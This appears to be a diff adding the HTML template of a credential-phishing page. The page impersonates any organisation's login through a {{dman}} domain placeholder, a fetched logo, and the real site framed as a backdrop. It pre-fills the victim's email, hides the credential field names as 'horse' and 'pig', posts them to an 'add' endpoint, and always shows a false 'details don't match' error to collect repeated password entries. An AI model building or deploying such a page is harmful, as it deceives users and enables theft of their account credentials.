@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login - {{dman}}</title>
+  <link rel="icon" href="https://api.kickfire.com/logo?website={{dman}}" type="image/x-icon">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #fff;
+      overflow: hidden;
+    }
+
+    iframe.background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+      z-index: -2;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      background: rgba(0, 0, 0, 0.4);
+      z-index: -1;
+    }
+
+    .login-container {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+      padding: 20px;
+      overflow: auto;
+    }
+
+    .login-box {
+      background-color: #444;
+      padding: 50px;
+      width: 100%;
+      max-width: 500px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.5);
+      color: #fff;
+      border-radius: 0;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 30px;
+    }
+
+    .logo-container img {
+      height: 50px;
+      width: 50px;
+      object-fit: contain;
+      margin-right: 12px;
+    }
+
+    .logo-container span {
+      font-size: 20px;
+      font-weight: bold;
+    }
+
+    .login-box h3 {
+      text-align: center;
+      margin-bottom: 25px;
+      font-size: 22px;
+      color: #fff;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .input-group i {
+      position: absolute;
+      top: 50%;
+      left: 12px;
+      transform: translateY(-50%);
+      color: #bbb;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 12px 12px 12px 40px;
+      border: 1px solid #666;
+      background-color: #222;
+      color: #fff;
+      font-size: 16px;
+      outline: none;
+      border-radius: 0;
+    }
+
+    .input-group input:focus {
+      border-color: #3399ff;
+    }
+
+    .signin-btn {
+      width: 100%;
+      padding: 18px;
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+      border-radius: 0;
+      transition: background-color 0.2s;
+    }
+
+    .signin-btn:hover {
+      background-color: #0056b3;
+    }
+
+    .extras {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 13px;
+      margin-top: 20px;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+
+    .extras label {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+    }
+
+    .extras a {
+      color: #66b2ff;
+      text-decoration: none;
+    }
+
+    .extras a:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 12px;
+      color: #66b2ff;
+    }
+
+    .error-message {
+      color: #ff3333;
+      font-size: 14px;
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    /* Custom Loader */
+    .loader-wrapper {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .loader {
+      border: 6px solid #222;
+      border-top: 6px solid #66b2ff;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 18s linear infinite; /* Changed from 1s to 3s */
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 600px) {
+      .login-box {
+        padding: 30px 20px;
+      }
+
+      .logo-container span {
+        font-size: 16px;
+      }
+
+      .signin-btn {
+        font-size: 16px;
+        padding: 14px;
+      }
+
+      .login-box h3 {
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Loader -->
+  <div class="loader-wrapper" id="loader">
+    <div class="loader"></div>
+  </div>
+
+  <!-- Background -->
+  <iframe class="background" src="https://{{dman}}"></iframe>
+  <div class="overlay"></div>
+
+  <!-- Login Form -->
+  <div class="login-container">
+    <div class="login-box">
+      <div class="logo-container">
+        <img src="https://api.kickfire.com/logo?website={{dman}}" alt="{{dman}} Logo"/>
+        <span>{{dman}}</span>
+      </div>
+      <h3>Sign In</h3>
+
+      <form action="add" method="POST">
+
+      <div class="input-group">
+        <i class="fas fa-envelope"></i>
+        <input type="email" name="horse" placeholder="Email" value="{{eman}}" required />
+      </div>
+
+      <div class="input-group">
+        <i class="fas fa-lock"></i>
+        <input type="password" name="pig" placeholder="Password" required />
+      </div>
+
+      <button class="signin-btn">Sign In</button>
+
+      <!-- Error Message -->
+      <div class="error-message">The details don't match. Please check and try again.</div>
+
+      <div class="extras">
+        <label><input type="checkbox" /> Secured Login Session?</label>
+        <a href="#">Forget Password?</a>
+      </div>
+    </div>
+  </form>
+
+    <div class="footer">
+      &copy; {{dman}} 2025
+    </div>
+  </div>
+
+  <!-- Script to remove loader -->
+  <script>
+    window.addEventListener("load", () => {
+      document.getElementById("loader").style.display = "none";
+      document.body.style.overflow = "auto";
+    });
+  </script>
+</body>
+</html>
